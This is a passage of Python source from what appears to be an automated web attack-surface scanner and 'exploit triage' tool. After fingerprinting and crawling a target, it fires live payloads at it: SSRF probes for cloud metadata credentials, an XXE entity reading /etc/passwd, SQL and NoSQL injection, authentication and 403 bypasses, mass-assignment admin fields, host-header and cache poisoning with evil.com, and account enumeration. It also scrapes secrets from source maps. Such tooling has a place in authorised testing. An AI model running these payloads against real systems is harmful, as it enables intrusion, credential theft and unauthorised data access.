        WORDLIST_HIDDEN_ADMIN + WORDLIST_INTERNAL_SUBPATH +
        WORDLIST_EMAIL_ORACLE_PATHS
    ))
    if "spring" in tech:
        paths += WORDLIST_SPRING
    if "laravel" in tech:
        paths += WORDLIST_LARAVEL
    if "django" in tech:
        paths += WORDLIST_DJANGO
    if "rails" in tech:
        paths += WORDLIST_RAILS
    if "express" in tech or "node" in tech:
        paths += WORDLIST_EXPRESS_NODE
    if "wordpress" in tech:
        paths += WORDLIST_WORDPRESS
    if "drupal" in tech:
        paths += WORDLIST_DRUPAL
    return list(dict.fromkeys(paths))


# ── HTTP client ───────────────────────────────────────────────────────────────

class HTTP:
    def __init__(self, sem, session: aiohttp.ClientSession, verbose=False, delay=0):
        self.sem = sem
        self.session = session
        self.verbose = verbose
        self.delay = delay

    async def get(self, url: str, **kw) -> Tuple[int, str, Dict]:
        return await self._req("GET", url, **kw)

    async def post(self, url: str, **kw) -> Tuple[int, str, Dict]:
        return await self._req("POST", url, **kw)

    async def options(self, url: str) -> Tuple[int, str, Dict]:
        return await self._req("OPTIONS", url)

    async def head(self, url: str) -> Tuple[int, str, Dict]:
        return await self._req("HEAD", url)

    async def _req(self, method: str, url: str, **kw) -> Tuple[int, str, Dict]:
        if self.delay:
            await asyncio.sleep(self.delay / 1000)
        async with self.sem:
            try:
                timeout = aiohttp.ClientTimeout(total=12, connect=6)
                async with self.session.request(method, url, timeout=timeout,
                                                 allow_redirects=False,
                                                 ssl=False, **kw) as r:
                    body = await r.text(errors="replace")
                    headers = dict(r.headers)
                    if self.verbose:
                        sym = G if r.status < 300 else (Y if r.status < 400 else (R if r.status >= 500 else DIM))
                        print(f"  {sym}{r.status}{RST} {method} {url}")
                    return r.status, body[:8000], headers
            except asyncio.TimeoutError:
                return 0, "", {}
            except Exception:
                return 0, "", {}


# ── Technology fingerprinting ─────────────────────────────────────────────────

TECH_SIGS = {
    "spring":    [r"X-Application-Context", r"actuator", r"Whitelabel Error", r"Spring Boot"],
    "laravel":   [r"laravel_session", r"Laravel", r"X-Powered-By.*PHP", r"XSRF-TOKEN"],
    "django":    [r"csrftoken", r"Django", r"X-Frame-Options.*SAMEORIGIN", r"__debug__"],
    "rails":     [r"_session_id", r"Rails", r"X-Runtime", r"X-Powered-By.*Phusion"],
    "express":   [r"X-Powered-By.*Express", r"connect\.sid"],
    "fastapi":   [r"FastAPI", r"uvicorn"],
    "wordpress": [r"WordPress", r"wp-content", r"wp-json", r"PHPSESSID.*wordpress"],
    "drupal":    [r"Drupal", r"X-Drupal-", r"X-Generator.*Drupal"],
    "joomla":    [r"Joomla", r"\/joomla\/"],
    "asp.net":   [r"ASP\.NET", r"__VIEWSTATE", r"X-AspNet-Version", r"X-Powered-By.*ASP"],
    "php":       [r"X-Powered-By.*PHP", r"PHPSESSID"],
    "nginx":     [r"nginx"],
    "apache":    [r"Apache"],
    "cloudflare":[r"cf-ray", r"cf-cache-status", r"cloudflare"],
    "akamai":    [r"X-Check-Cacheable", r"Akamai"],
    "nextjs":    [r"__NEXT_DATA__", r"Next\.js", r"x-nextjs"],
    "graphql":   [r"application/graphql", r"__typename"],
    "java":      [r"JSESSIONID", r"java\.lang", r"javax\."],
    "node":      [r"X-Powered-By.*Node", r"\.js"],
}


async def fingerprint(http: HTTP, base: str) -> Set[str]:
    tech: Set[str] = set()
    for path in ["", "/", "robots.txt", "api/", "api/v1/"]:
        url = f"{base.rstrip('/')}/{path.lstrip('/')}"
        status, body, headers = await http.get(url)
        if not status:
            continue
        all_text = body + " " + " ".join(f"{k}: {v}" for k, v in headers.items())
        for t, patterns in TECH_SIGS.items():
            for p in patterns:
                if re.search(p, all_text, re.I):
                    tech.add(t)
    if tech:
        print(f"  {C}Tech:{RST} {', '.join(sorted(tech))}")
    return tech


# ── Passive sources ───────────────────────────────────────────────────────────

async def passive_wayback(http: HTTP, host: str) -> List[str]:
    urls = []
    try:
        api = f"https://web.archive.org/cdx/search/cdx?url={host}/*&output=json&fl=original&collapse=urlkey&limit=5000&filter=statuscode:200"
        status, body, _ = await http.get(api)
        if status == 200 and body:
            rows = json.loads(body)
            for row in rows[1:]:
                u = row[0] if row else ""
                if u:
                    urls.append(u)
    except Exception:
        pass
    print(f"  {DIM}Wayback Machine: {len(urls)} URLs{RST}")
    return urls


async def passive_urlscan(http: HTTP, host: str) -> List[str]:
    urls = []
    try:
        api = f"https://urlscan.io/api/v1/search/?q=domain:{host}&size=1000"
        status, body, _ = await http.get(api)
        if status == 200 and body:
            data = json.loads(body)
            for result in data.get("results", []):
                page = result.get("page", {})
                u = page.get("url", "")
                if u:
                    urls.append(u)
    except Exception:
        pass
    print(f"  {DIM}URLScan: {len(urls)} URLs{RST}")
    return urls


async def passive_commoncrawl(http: HTTP, host: str) -> List[str]:
    urls = []
    try:
        api = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url={host}/*&output=json&limit=2000"
        status, body, _ = await http.get(api)
        if status == 200 and body:
            for line in body.splitlines():
                try:
                    row = json.loads(line)
                    u = row.get("url", "")
                    if u:
                        urls.append(u)
                except Exception:
                    pass
    except Exception:
        pass
    print(f"  {DIM}CommonCrawl: {len(urls)} URLs{RST}")
    return urls


async def passive_otx(http: HTTP, host: str) -> List[str]:
    urls = []
    try:
        api = f"https://otx.alienvault.com/api/v1/indicators/domain/{host}/url_list?limit=500"
        status, body, _ = await http.get(api)
        if status == 200 and body:
            data = json.loads(body)
            for item in data.get("url_list", []):
                u = item.get("url", "")
                if u:
                    urls.append(u)
    except Exception:
        pass
    print(f"  {DIM}OTX: {len(urls)} URLs{RST}")
    return urls


async def passive_crtsh(http: HTTP, host: str) -> List[str]:
    subdomains = []
    try:
        api = f"https://crt.sh/?q=%.{host}&output=json"
        status, body, _ = await http.get(api)
        if status == 200 and body:
            data = json.loads(body)
            for entry in data:
                name = entry.get("name_value", "")
                for n in name.split("\n"):
                    n = n.strip().lstrip("*.")
                    if n and host in n:
                        subdomains.append(n)
    except Exception:
        pass
    subs = list(set(subdomains))
    if subs:
        print(f"  {DIM}crt.sh subdomains: {', '.join(subs[:20])}{'...' if len(subs)>20 else ''}{RST}")
    return subs


def extract_host(base: str) -> str:
    parsed = urllib.parse.urlparse(base)
    host = parsed.hostname or ""
    return re.sub(r"^www\.", "", host)


# ── Crawling ──────────────────────────────────────────────────────────────────

JS_PATTERNS = [
    re.compile(r"""(?:fetch|axios(?:\.\w+)?|http(?:Client)?\.(?:get|post|put|delete|patch|request))\s*\(\s*['"`]([^'"`\s]{2,200})['"`]"""),
    re.compile(r"""(?:url|endpoint|path|api|baseURL|BASE_URL|API_URL|apiUrl|apiPath)\s*[:=]\s*['"`]([/][^'"`\s]{1,200})['"`]"""),
    re.compile(r"""['"`](/(?:api|v\d|rest|graphql|auth|users?|admin)[^'"`\s]{0,150})['"`]"""),
    re.compile(r"""routes?\.(?:get|post|put|delete|patch|use)\s*\(\s*['"`]([^'"`\s]{2,200})['"`]"""),
    re.compile(r"""path\s*:\s*['"`]([/][^'"`\s]{1,200})['"`]"""),
    re.compile(r"""href\s*=\s*['"]([/][^'"]{1,200})['"]"""),
    re.compile(r"""action\s*=\s*['"]([/][^'"]{1,200})['"]"""),
]

SOURCEMAP_SECRET = re.compile(
    r"""(?:api[_-]?key|secret|password|token|auth|credential|private[_-]?key|access[_-]?key|aws[_-]?key|bearer)\s*[:=]\s*['"`]([A-Za-z0-9+/=_\-]{8,80})['"`]""",
    re.I
)


async def crawl(http: HTTP, base: str, depth: int = 3) -> Tuple[List[str], List[str]]:
    visited: Set[str] = set()
    found_paths: List[str] = []
    found_js: List[str] = []
    queue = [base]
    parsed_base = urllib.parse.urlparse(base)

    for _ in range(depth):
        next_queue = []
        tasks = [http.get(u) for u in queue if u not in visited]
        visited.update(queue)
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for url, result in zip([u for u in queue if u not in visited], results):
            if isinstance(result, Exception):
                continue
            status, body, headers = result
            if not body:
                continue

            ct = headers.get("Content-Type", "")
            if "javascript" in ct or url.endswith(".js"):
                for pat in JS_PATTERNS:
                    for m in pat.findall(body):
                        p = m.strip()
                        if p.startswith("/") or p.startswith("http"):
                            found_paths.append(p)
                # source map check
                if "//# sourceMappingURL=" in body:
                    sm = re.search(r"//# sourceMappingURL=(.+\.map)", body)
                    if sm:
                        map_url = urllib.parse.urljoin(url, sm.group(1))
                        found_js.append(map_url)
                continue

            soup = BeautifulSoup(body, "lxml")
            for tag in soup.find_all(["a", "form", "link", "script", "img", "iframe", "button"]):
                href = tag.get("href") or tag.get("src") or tag.get("action") or ""
                if not href or href.startswith(("mailto:", "tel:", "javascript:", "#")):
                    continue
                abs_url = urllib.parse.urljoin(url, href)
                p_url = urllib.parse.urlparse(abs_url)
                if p_url.hostname != parsed_base.hostname:
                    continue
                path = p_url.path
                if path and path not in found_paths:
                    found_paths.append(path)
                if abs_url not in visited and abs_url not in next_queue:
                    next_queue.append(abs_url)

            # Extract inline JS paths
            for script in soup.find_all("script"):
                src = script.get("src", "")
                if src:
                    js_url = urllib.parse.urljoin(url, src)
                    if js_url not in visited:
                        next_queue.append(js_url)
                code = script.string or ""
                if code:
                    for pat in JS_PATTERNS:
                        for m in pat.findall(code):
                            if m.startswith("/"):
                                found_paths.append(m)

            # Next.js __NEXT_DATA__
            next_data = soup.find("script", id="__NEXT_DATA__")
            if next_data and next_data.string:
                try:
                    nd = json.loads(next_data.string)
                    routes = _extract_nextjs_routes(nd)
                    found_paths.extend(routes)
                except Exception:
                    pass

        queue = list(dict.fromkeys(next_queue))[:200]

    return list(dict.fromkeys(found_paths)), found_js


def _extract_nextjs_routes(obj, depth=0) -> List[str]:
    if depth > 6:
        return []
    routes = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in ("page", "pathname", "route", "href", "as") and isinstance(v, str) and v.startswith("/"):
                routes.append(v)
            routes.extend(_extract_nextjs_routes(v, depth+1))
    elif isinstance(obj, list):
        for item in obj:
            routes.extend(_extract_nextjs_routes(item, depth+1))
    return routes


async def fetch_sourcemap(http: HTTP, map_url: str) -> Tuple[List[str], List[str]]:
    paths = []
    secrets = []
    status, body, _ = await http.get(map_url)
    if status != 200 or not body:
        return paths, secrets
    try:
        data = json.loads(body)
        sources = data.get("sources", []) or data.get("sourceRoot", [])
        for src in (sources if isinstance(sources, list) else [sources]):
            if isinstance(src, str):
                paths.append(src)
        content = " ".join(data.get("sourcesContent", []) or [])
        for m in SOURCEMAP_SECRET.finditer(content):
            secrets.append(f"[SOURCEMAP SECRET] {m.group(0)[:120]}")
        for pat in JS_PATTERNS:
            for m in pat.findall(content):
                if m.startswith("/"):
                    paths.append(m)
    except Exception:
        pass
    return paths, secrets


# ── Spec parsing ──────────────────────────────────────────────────────────────

async def parse_openapi(http: HTTP, base: str) -> List[Endpoint]:
    endpoints = []
    spec_paths = [
        "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
        "api-docs", "api/docs", "api/v1/swagger.json", "api/v2/swagger.json",
        "api/v1/openapi.json", "v2/api-docs", "v3/api-docs",
        "api/swagger.json", "api/openapi.json",
    ]
    for sp in spec_paths:
        url = f"{base.rstrip('/')}/{sp}"
        status, body, _ = await http.get(url)
        if status != 200 or not body:
            continue
        try:
            spec = json.loads(body)
        except Exception:
            try:
                import yaml
                spec = yaml.safe_load(body)
            except Exception:
                continue

        prefix = spec.get("basePath", "") or ""
        for path, methods in (spec.get("paths") or {}).items():
            full_path = f"{prefix}{path}".lstrip("/")
            ep = Endpoint(
                url=f"{base.rstrip('/')}/{full_path}",
                path=full_path,
                source="spec",
            )
            # tag by path
            for pat, tags in TAG_RULES:
                if pat.search(path):
                    ep.tags.update(tags)
            # inspect parameters
            all_params = []
            for method, mdata in methods.items():
                if not isinstance(mdata, dict):
                    continue
                ep.methods.append(method.upper())
                for param in mdata.get("parameters", []):
                    pname = param.get("name", "")
                    ploc = param.get("in", "")
                    all_params.append(pname)
                    if PARAM_SSRF.match(pname):
                        ep.tags.add("SSRF"); ep.tags.add("OPEN_REDIRECT")
                        ep.notes.append(f"Param ?{pname}= → SSRF/redirect sink")
                    if PARAM_IDOR.match(pname):
                        ep.tags.add("IDOR")
                        ep.notes.append(f"Param {pname} (in {ploc}) → IDOR candidate")
                    if PARAM_INJECT.match(pname):
                        ep.tags.add("INJECTION")
            ep.params = all_params
            # path params like {id}
            if re.search(r"\{(id|uuid|user_id|account_id)\}", path, re.I):
                ep.tags.add("IDOR")
            endpoints.append(ep)
        print(f"  {G}OpenAPI spec:{RST} {url} → {len(endpoints)} endpoints")
        break
    return endpoints


async def parse_graphql(http: HTTP, base: str) -> List[Endpoint]:
    endpoints = []
    introspection = {
        "query": """
        { __schema { types { name kind fields { name type { name kind } } }
          queryType { name } mutationType { name } subscriptionType { name } } }
        """
    }
    for gql_path in ["graphql", "gql", "api/graphql", "graph", "graphql/", "api/v1/graphql"]:
        url = f"{base.rstrip('/')}/{gql_path}"
        status, body, _ = await http.post(url, json=introspection,
                                           headers={"Content-Type": "application/json"})
        if status != 200 or not body:
            continue
        try:
            data = json.loads(body)
            schema = data.get("data", {}).get("__schema", {})
            if not schema:
                continue
            ep = Endpoint(url=url, path=gql_path, status=200, source="graphql")
            ep.tags.add("GRAPHQL")
            ep.notes.append("GraphQL introspection ENABLED")
            # Check for sensitive field names
            sensitive = re.compile(r"password|secret|token|ssn|key|flag|admin|credit|card|cvv|pin|private", re.I)
            mutations = []
            for t in schema.get("types", []):
                if t.get("kind") == "OBJECT" and not t.get("name", "").startswith("__"):
                    for f in (t.get("fields") or []):
                        fname = f.get("name", "")
                        if sensitive.search(fname):
                            ep.tags.add("INFO_DISC")
                            ep.notes.append(f"Sensitive GraphQL field: {t['name']}.{fname}")
            if schema.get("mutationType"):
                ep.tags.add("ADMIN")
                ep.notes.append("GraphQL mutations available — test for privilege escalation")
            endpoints.append(ep)
            print(f"  {R}GraphQL introspection:{RST} {url}")
            break
        except Exception:
            pass
    return endpoints


# ── Probing ───────────────────────────────────────────────────────────────────

def interesting(status: int, body: str) -> bool:
    return status in (200, 201, 204, 206, 301, 302, 307, 308, 400, 401, 403, 405, 422, 500)


async def probe_paths(http: HTTP, base: str, paths: List[str]) -> List[Endpoint]:
    base = base.rstrip("/")
    found: List[Endpoint] = []

    async def check(path: str):
        path = path.lstrip("/")
        url = f"{base}/{path}"
        status, body, headers = await http.get(url)
        if not interesting(status, body):
            return
        ep = Endpoint(
            url=url, path=path, status=status,
            content_type=headers.get("Content-Type", ""),
            body_sample=body[:300],
            source="wordlist",
            response_headers=headers,
            response_size=len(body),
        )
        ep.redirect_to = headers.get("Location", "")
        for pat, tags in TAG_RULES:
            if pat.search("/" + path):
                ep.tags.update(tags)
        # Security header analysis
        _check_security_headers(ep, headers)
        found.append(ep)

    sem_batch = asyncio.Semaphore(min(len(paths), 50))
    async def sem_check(p):
        async with sem_batch:
            await check(p)

    await asyncio.gather(*[sem_check(p) for p in paths])
    return found


def _check_security_headers(ep: Endpoint, headers: Dict):
    missing = []
    if not headers.get("Content-Security-Policy") and not headers.get("X-Content-Security-Policy"):
        missing.append("CSP")
    if not headers.get("Strict-Transport-Security"):
        missing.append("HSTS")
    if not headers.get("X-Frame-Options") and "frame-ancestors" not in headers.get("Content-Security-Policy", ""):
        missing.append("X-Frame-Options")
    if not headers.get("X-Content-Type-Options"):
        missing.append("X-Content-Type-Options")
    if missing and ep.status == 200:
        ep.notes.append(f"Missing security headers: {', '.join(missing)}")
    # Info disclosure in headers
    for h in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"]:
        v = headers.get(h, "")
        if v:
            ep.tags.add("INFO_DISC")
            ep.notes.append(f"Header {h}: {v}")


# ── Exploit triage ────────────────────────────────────────────────────────────

async def triage_cors(http: HTTP, ep: Endpoint) -> None:
    evil_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{extract_host(ep.url)}.com",
    ]
    for origin in evil_origins:
        status, body, headers = await http.get(ep.url, headers={"Origin": origin})
        acao = headers.get("Access-Control-Allow-Origin", "")
        acac = headers.get("Access-Control-Allow-Credentials", "")
        if not acao:
            continue
        if acao == origin or acao == "*":
            ep.tags.add("CORS")
            if acac.lower() == "true" and acao != "*":
                ep.notes.append(f"CRITICAL CORS: Origin '{origin}' reflected with ACAC:true → XSH credential theft")
                ep.tags.add("AUTH_BYPASS")
            else:
                ep.notes.append(f"CORS: Origin '{origin}' reflected (ACAC:{acac or 'false'})")
            break


async def triage_auth_bypass(http: HTTP, ep: Endpoint) -> None:
    tests = [
        ({}, "no token"),
        ({"Authorization": ""}, "empty token"),
        ({"Authorization": "null"}, "null token"),
        ({"Authorization": "Bearer undefined"}, "undefined token"),
        ({"Authorization": "Bearer null"}, "Bearer null"),
        ({"Authorization": "Bearer 0"}, "Bearer 0"),
        ({"X-Original-URL": "/admin"}, "X-Original-URL override"),
        ({"X-Rewrite-URL": "/admin"}, "X-Rewrite-URL override"),
        ({"X-Override-URL": ep.url}, "X-Override-URL"),
    ]
    for hdrs, label in tests:
        status, body, headers = await http.get(ep.url, headers=hdrs)
        if status in (200, 201):
            ep.requires_auth = False
            ep.tags.add("AUTH_BYPASS")
            ep.notes.append(f"Auth bypass: {label} → {status}")
            return
    # 403 bypass tricks
    tricks = [
        (ep.url + "/", "trailing slash"),
        (ep.url + "/..", "dot-dot suffix"),
        (ep.url + ";", "semicolon suffix"),
        (ep.url + "%20", "encoded space"),
        (ep.url + "?", "query string"),
    ]
    for url, label in tricks:
        status, body, headers = await http.get(url)
        if status in (200, 201):
            ep.requires_auth = False
            ep.tags.add("AUTH_BYPASS")
            ep.notes.append(f"403 bypass: {label} → {url}")
            return


async def triage_verb_tamper(http: HTTP, ep: Endpoint) -> None:
    dangerous = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]
    opts_status, _, opts_headers = await http.options(ep.url)
    allow = opts_headers.get("Allow", opts_headers.get("Access-Control-Allow-Methods", ""))
    if allow:
        ep.notes.append(f"Allow: {allow}")
        for v in dangerous:
            if v in allow:
                ep.tags.add("AUTH_BYPASS" if v in ("PUT", "DELETE", "PATCH") else "INFO_DISC")
                ep.notes.append(f"Dangerous verb allowed: {v}")
    if "TRACE" in allow:
        ep.tags.add("INFO_DISC")
        ep.notes.append("TRACE enabled → potential XST (Cross-Site Tracing)")
    ep.methods = [m.strip() for m in allow.split(",") if m.strip()]


async def triage_mass_assignment(http: HTTP, ep: Endpoint) -> None:
    evil_payload = {
        "role": "admin",
        "is_admin": True,
        "admin": True,
        "balance": 999999,
        "credits": 999999,
        "permissions": ["admin", "superuser"],
        "is_superuser": True,
        "scope": "admin",
    }
    status, body, headers = await http.post(ep.url, json=evil_payload,
                                             headers={"Content-Type": "application/json"})
    if status in (200, 201) and body:
        for key in ["admin", "role", "is_admin", "balance", "is_superuser", "permissions"]:
            if key in body:
                ep.tags.add("MASS_ASSIGN")
                ep.notes.append(f"Mass assignment: field '{key}' reflected in response")
                return
    status, body, headers = await http.get(ep.url + "?_method=PUT",
                                             headers={"Content-Type": "application/json"},)


async def triage_jwt(ep: Endpoint) -> None:
    auth_header = ep.response_headers.get("Authorization", "")
    set_cookie = ep.response_headers.get("Set-Cookie", "")
    # Check if token-related endpoint
    if not any(t in ep.tags for t in ["JWT", "OAUTH"]):
        return
    ep.notes.append("JWT endpoint — test: alg:none, HS256→RS256 confusion, weak secret (secret123/password/jwt/changeme)")
    ep.notes.append("Manual: copy token to jwt.io, change alg to 'none', remove signature")


async def triage_rate_limit(http: HTTP, ep: Endpoint, login_fields: Optional[dict] = None) -> None:
    payload = login_fields or {"username": "admin", "password": "password"}
    tasks = [http.post(ep.url, json=payload) for _ in range(12)]
    results = await asyncio.gather(*tasks)
    statuses = [r[0] for r in results if r[0]]
    if 429 in statuses:
        ep.notes.append("Rate limit enforced (429 detected)")
    elif len(set(statuses)) == 1 and statuses[0] in (200, 401):
        ep.tags.add("RATE_LIMIT")
        ep.notes.append(f"No rate limiting detected — all {len(statuses)} rapid requests returned {statuses[0]}")


async def triage_account_enum(http: HTTP, base: str, ep: Endpoint) -> None:
    NONEXIST = "_zzz_no_such_user_xqq_"
    TEST_USERS = ["admin", "administrator", "test", "root", "info", "support",
                  "noreply", "postmaster", "abuse", "security", "contact",
                  "webmaster", "no-reply", "donotreply", "help", "user",
                  "guest", "demo"]

    baseline_s, baseline_b, _ = await http.post(ep.url,
        json={"username": NONEXIST, "password": "wrongpass"},
        headers={"Content-Type": "application/json"})
    baseline_email_s, baseline_email_b, _ = await http.post(ep.url,
        json={"email": f"{NONEXIST}@example.com", "password": "wrongpass"},
        headers={"Content-Type": "application/json"})

    oracle_phrases = re.compile(
        r"(user\s+(not found|doesn.t exist|does not exist|invalid|unknown)|"
        r"account\s+(not found|doesn.t exist|does not exist)|"
        r"email\s+(not found|not registered|unknown|invalid)|"
        r"no\s+account\s+found|invalid\s+email\s+address|"
        r"that\s+email\s+address\s+(isn.t|is not)|"
        r"we\s+couldn.t\s+find|username\s+not\s+found|"
        r"incorrect\s+username|wrong\s+username)",
        re.I
    )

    findings = []
    for username in TEST_USERS[:6]:
        t0 = time.time()
        status, body, _ = await http.post(ep.url,
            json={"username": username, "password": "wrongpass"},
            headers={"Content-Type": "application/json"})
        elapsed = time.time() - t0

        if status != baseline_s:
            findings.append(f"Status oracle: '{username}' → {status} (baseline:{baseline_s})")
            ep.tags.add("ACCOUNT_ENUM")
        if abs(len(body) - len(baseline_b)) > 25:
            findings.append(f"Body-length oracle: '{username}' body={len(body)} baseline={len(baseline_b)}")
            ep.tags.add("ACCOUNT_ENUM")
        if oracle_phrases.search(body):
            findings.append(f"Verbose error for '{username}': {oracle_phrases.search(body).group(0)}")
            ep.tags.add("ACCOUNT_ENUM")

    if findings:
        ep.notes.extend(findings[:4])
    elif any(oracle_phrases.search(b) for b in [baseline_b, baseline_email_b]):
        ep.tags.add("ACCOUNT_ENUM")
        ep.notes.append("Verbose user-not-found error on nonexistent account")


async def triage_ssrf(http: HTTP, ep: Endpoint) -> None:
    canary_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.170.2/v2/credentials",  # ECS
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        "http://localhost:22",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "dict://127.0.0.1:6379/info",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_*1%0d%0a",
    ]
    for payload in canary_payloads[:3]:
        for param in ["url", "uri", "target", "redirect", "endpoint", "webhook", "src", "href", "ref"]:
            status, body, _ = await http.get(ep.url, params={param: payload})
            if status == 200 and any(s in body for s in ["ami-id", "meta-data", "computeMetadata", "root:", "ec2"]):
                ep.tags.add("SSRF")
                ep.notes.append(f"SSRF confirmed: ?{param}={payload[:60]} → metadata response")
                return
            if status not in (0, 400, 403, 404):
                ep.tags.add("SSRF")
                ep.notes.append(f"SSRF candidate: ?{param}={payload[:50]} → {status}")


async def triage_open_redirect(http: HTTP, ep: Endpoint) -> None:
    payloads = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https:evil.com",
        "https://evil.com%2F@legitimate.com",
    ]
    for param in ["redirect", "return", "next", "goto", "url", "target", "continue", "return_url", "success_url"]:
        for payload in payloads[:2]:
            status, body, headers = await http.get(ep.url + f"?{param}={payload}")
            loc = headers.get("Location", "")
            if "evil.com" in loc and status in (301, 302, 307, 308):
                ep.tags.add("OPEN_REDIRECT")
                ep.notes.append(f"Open redirect: ?{param}={payload} → {loc}")
                return


async def triage_host_header(http: HTTP, ep: Endpoint) -> None:
    evils = {
        "Host": "evil.com",
        "X-Forwarded-Host": "evil.com",
        "X-Host": "evil.com",
        "X-Forwarded-Server": "evil.com",
        "X-HTTP-Host-Override": "evil.com",
        "Forwarded": "host=evil.com",
    }
    for h, v in evils.items():
        status, body, headers = await http.get(ep.url, headers={h: v})
        if "evil.com" in body:
            ep.tags.add("HOST_HEADER")
            ep.notes.append(f"Host header injection: {h}: {v} reflected in response")
            return
    # Password reset poisoning
    if "reset" in ep.path.lower() or "password" in ep.path.lower() or "forgot" in ep.path.lower():
        status, body, _ = await http.post(ep.url,
            json={"email": "admin@example.com"},
            headers={"Host": "evil.com", "Content-Type": "application/json"})
        if "evil.com" in body:
            ep.tags.add("HOST_HEADER")
            ep.notes.append("Password reset poisoning: Host: evil.com reflected in reset link")


async def triage_cache_poison(http: HTTP, ep: Endpoint) -> None:
    unkeyed_headers = {
        "X-Forwarded-Host": "evil.com",
        "X-Forwarded-Scheme": "nothttps",
        "X-Original-URL": "/evil",
        "X-Rewrite-URL": "/evil",
        "X-Forwarded-Prefix": "/evil",
        "X-Host": "evil.com",
    }
    for h, v in unkeyed_headers.items():
        status, body, headers = await http.get(ep.url, headers={h: v})
        if v in body or (h == "X-Forwarded-Scheme" and "nothttps" in body):
            ep.tags.add("CACHE_POISON")
            ep.notes.append(f"Cache poison candidate: {h}: {v} reflected in response")
            return


async def triage_idor(http: HTTP, ep: Endpoint) -> None:
    # Already has IDOR tag from path analysis; add next steps
    if "IDOR" not in ep.tags:
        return
    # Try incrementing numeric IDs in path
    for m in re.finditer(r"/(\d+)(?:/|$)", ep.path):
        base_id = int(m.group(1))
        for test_id in [1, 2, 3, base_id - 1, base_id + 1]:
            if test_id <= 0:
                continue
            test_url = ep.url.replace(f"/{base_id}", f"/{test_id}", 1)
            status, body, _ = await http.get(test_url)
            if status in (200, 201):
                ep.notes.append(f"IDOR: {test_url} → {status} (potential other-user data access)")
                ep.requires_auth = False if status == 200 else ep.requires_auth
                break


async def triage_xxe(http: HTTP, ep: Endpoint) -> None:
    if not any(t in ep.tags for t in ["XXE", "FILE_OPS"]):
        return
    xxe_payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
    status, body, _ = await http.post(ep.url, data=xxe_payload,
                                       headers={"Content-Type": "application/xml"})
    if "root:" in body or "nobody:" in body or "daemon:" in body:
        ep.tags.add("XXE")
        ep.notes.append("XXE CONFIRMED: /etc/passwd content in response")
    elif status in (200, 500):
        ep.notes.append("XXE probe returned response — test manually with OOB SSRF entity")


async def triage_sql_injection(http: HTTP, ep: Endpoint) -> None:
    sqli_payloads = ["'", "''", "' OR '1'='1", "1 OR 1=1 --", "1' AND SLEEP(0)--"]
    error_sigs = re.compile(
        r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
        r"Warning.*mysql_|syntax error|SQLSTATE|ODBC Driver|"
        r"Microsoft OLE DB|Unclosed quotation|You have an error in your SQL)",
        re.I
    )
    for payload in sqli_payloads[:2]:
        for param in ["id", "user_id", "q", "search", "filter", "sort", "order"]:
            status, body, _ = await http.get(ep.url, params={param: payload})
            if error_sigs.search(body):
                ep.tags.add("SQLI")
                ep.notes.append(f"SQLi error: ?{param}={payload!r} → DB error signature")
                return


async def triage_nosql(http: HTTP, ep: Endpoint) -> None:
    payloads = [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": "x"}, "password": {"$ne": "x"}},
        {"username": "admin", "password": {"$regex": ".*"}},
    ]
    for payload in payloads:
        status, body, _ = await http.post(ep.url, json=payload,
                                           headers={"Content-Type": "application/json"})
        if status in (200, 201) and any(k in body.lower() for k in ["token", "auth", "success", "user"]):
            ep.tags.add("NOSQL")
            ep.notes.append(f"NoSQL injection bypass: {json.dumps(payload)[:80]} → {status}")
            return


# ── Auth boundary mapping ─────────────────────────────────────────────────────

async def map_auth_boundary(http: HTTP, endpoints: List[Endpoint]) -> None:
    high_value_tags = {"ADMIN", "IDOR", "INFO_DISC", "BUSINESS_LOGIC", "AUTH_BYPASS", "MASS_ASSIGN"}
    targets = [ep for ep in endpoints if ep.tags & high_value_tags]

    async def check_unauthed(ep: Endpoint):
        status, body, _ = await http.get(ep.url)
        if status in (200, 201, 204):
            ep.requires_auth = False
            ep.tags.add("AUTH_BYPASS")
            ep.notes.append(f"Accessible without auth: {status}")
        elif status == 403:
            ep.requires_auth = True
            ep.notes.append("Returns 403 — attempt bypass techniques")
        elif status == 401:
            ep.requires_auth = True

    await asyncio.gather(*[check_unauthed(ep) for ep in targets])


# ── Report ────────────────────────────────────────────────────────────────────

TAG_COLOR = {
    "AUTH_BYPASS": R, "ACCOUNT_ENUM": R, "ADMIN": R, "SQLI": R,
    "SSTI": R, "XXE": R, "DESERIALIZATION": R, "HTTP_SMUGGLING": R,
    "IDOR": Y, "INFO_DISC": Y, "SSRF": Y, "INJECTION": Y, "JWT": Y, "GRAPHQL": Y,
    "CORS": M, "MASS_ASSIGN": M, "OPEN_REDIRECT": M, "PATH_TRAVERSAL": M,
    "CACHE_POISON": B, "HOST_HEADER": B, "RACE_CONDITION": B, "NOSQL": B,
    "OAUTH": C, "BUSINESS_LOGIC": C, "FILE_OPS": C, "RATE_LIMIT": G,
    "CORS": M, "CSRF": DIM, "WEBSOCKET": DIM, "XSS": Y, "LDAP": Y,
}

NEXT_STEPS = {
    "ACCOUNT_ENUM": "Probe with valid usernames; compare response status/body/timing for nonexistent vs valid accounts",
    "IDOR": "Replace your ID with 1,2,3 or other users' IDs; try UUIDs from /users list; test without auth",
    "AUTH_BYPASS": "Send request with no token / null token / altered token; try HTTP verb switching; path suffix tricks",
    "ADMIN": "Access without auth or with low-priv token; check for full user list / config / delete endpoints",
    "INFO_DISC": "Read sensitive config values; check for JWT secrets, DB creds, AWS keys in response",
    "SQLI": "Test SLEEP/WAITFOR, UNION SELECT, error-based; use sqlmap with --risk=3 --level=5",
